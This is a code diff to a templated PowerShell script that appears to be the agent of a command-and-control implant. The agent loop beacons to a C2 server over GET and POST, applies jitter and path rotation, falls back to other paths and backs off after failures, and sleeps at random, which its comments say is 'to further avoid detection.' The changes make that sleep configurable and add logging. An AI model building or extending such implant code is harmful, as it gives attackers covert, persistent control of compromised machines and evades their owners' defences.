@@ -15,7 +15,8 @@ $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
 $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage
 $maxFailuresBeforeFallback = {{MAX_FAILURES}}
 $maxBackoffTime = {{MAX_BACKOFF}}
-$maxSleepTime = {{MAX_SLEEP_TIME}}
+$randomSleepEnabled = {{RANDOM_SLEEP_ENABLED}}  # Optional random sleep between operations
+$maxSleepTime = {{MAX_SLEEP_TIME}}  # Maximum sleep time in seconds
 $userAgent = "{{USER_AGENT}}"
 
 # Authentication credentials (if configured)
@@ -658,6 +659,7 @@ function Start-RandomSleep {
 }
 
 # Main agent loop
+# Main agent loop
 function Start-AgentLoop {
     # Track failed connection attempts for fallback
     $consecutiveFailures = 0
@@ -667,9 +669,11 @@ function Start-AgentLoop {
     
     while ($true) {
         try {
-            # Randomly sleep before operations to further avoid detection
-            # This creates more unpredictable timing patterns
-            Start-RandomSleep | Out-Null
+            # Only perform random sleep if enabled (config controlled)
+            if ($randomSleepEnabled) {
+                # Randomly sleep before operations to further avoid detection
+                Start-RandomSleep | Out-Null
+            }
             
             # Check if rotation time has passed but we haven't got new paths yet
             Check-PathRotation
@@ -677,6 +681,7 @@ function Start-AgentLoop {
             # Add jitter to beacon interval
             $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
             $actualInterval = $beaconInterval * $jitterFactor
+            Write-Host "Using beacon interval: $actualInterval seconds (base: $beaconInterval, jitter: $jitterPercentage%)"
             
             # Get current beacon path based on rotation status
             $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
@@ -707,6 +712,7 @@ function Start-AgentLoop {
                 $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
                 
                 # Always use POST for first contact
+                Write-Host "Sending first contact beacon to $beaconUrl"
                 $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson -IsFirstContact $true
             }
             # For established contacts or after secure channel is established
@@ -734,8 +740,10 @@ function Start-AgentLoop {
                 # Beacon to the C2 server using either GET or POST
                 $response = ""
                 if ($useGetMethod) {
+                    Write-Host "Sending GET beacon to $beaconUrl (established connection)"
                     $response = Send-GetBeacon -Url $beaconUrl -EncodedData $beaconPayload.d -Token $randomToken
                 } else {
+                    Write-Host "Sending POST beacon to $beaconUrl (established connection)"
                     $response = Send-PostBeacon -Url $beaconUrl -PayloadJson $beaconJson
                 }
             }
@@ -793,7 +801,7 @@ function Start-AgentLoop {
             # If still failing with fallback paths, increase the beacon interval temporarily
             if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
                 # Exponential backoff with max of the configured max backoff time
-                $backoffSeconds = [Math]::Min($maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
+                $backoffSeconds = [Math]::Min([int]$maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
                 Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                 Start-Sleep -Seconds $backoffSeconds
                 continue
@@ -801,6 +809,7 @@ function Start-AgentLoop {
         }
         
         # Wait for next beacon interval
+        Write-Host "Sleeping for $actualInterval seconds until next beacon"
         Start-Sleep -Seconds $actualInterval
     }
 }
